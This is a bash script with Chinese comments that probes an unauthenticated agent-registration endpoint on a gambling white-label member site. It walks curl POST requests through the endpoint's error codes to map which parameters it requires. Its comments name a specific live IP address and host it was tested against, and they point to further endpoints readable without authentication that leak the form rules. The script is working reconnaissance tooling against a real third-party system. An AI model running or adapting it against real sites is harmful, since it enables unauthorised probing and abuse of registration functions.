#!/usr/bin/env bash
# 包网会员站「代理在线自助注册」接口 未鉴权可达性 + 参数契约枚举
# 用法：bash addagent-param-walk.sh HOST_IP:PORT BRAND_HOST
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./addagent-param-walk.sh <IP:PORT>\n' >&2; exit 1; fi
IP="${1:?IP:PORT}"; HOSTH="${2:?BRAND_HOST}"

post(){ curl -sk -m 20 -X POST "https://$IP/infe/rest/registeragent/addAgent.json" \
  -H "Host: $HOSTH" -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' --data "$1"; echo; }

echo '== 0) 基线：确认未鉴权可达（无 Cookie / 无 token）'
post ''                                   # 期望 111032502  please input agent account
echo '== 1) 给 account（这一步会暴露 account 是否被当作“上级代理/推广码”）'
post 'account=zq7k2m9x'                   # 期望 111032518  account format error
echo '== 2) 给 account + password（缺确认密码）'
post 'account=zq7k2m9x&password=abc123'   # 期望 111032538  passwords not equal (errorParam=passwd)
echo '== 3) 补 passwd（两者一致）→ 若回到 account 错误，则 account 是唯一卡点'
post 'account=zq7k2m9x&password=abc123&passwd=abc123'

# 判定表（已在 103.243.20.70:9900 / Host: 7h999.com:9900 实测）
#   111032502 => 缺 account          （errorParam=account）
#   111032538 => password != passwd  （errorParam=passwd）
#   111032518 => account 格式不合规  （errorParam=account）  ← 本脚本的终点
#   111032554 => 内部异常（PHP notice / 参数名不匹配）
#   1110325xx 域内还有：未开放在线新增代理 / 预设代理不存在 / 推广码或代理错误 / 仅允许输入数字
#
# 直接判定「注册是否开启」：返回 1110325xx 而不是 404/403/405，即服务端注册功能是开的。
# 注意：/cl/ 与 /infe/rest/registeragent/{baseInfo,checkUser}.json 同批未鉴权可读，
#       baseInfo.json 直接给出注册表单必填规则（ruleData.basicInfo）。
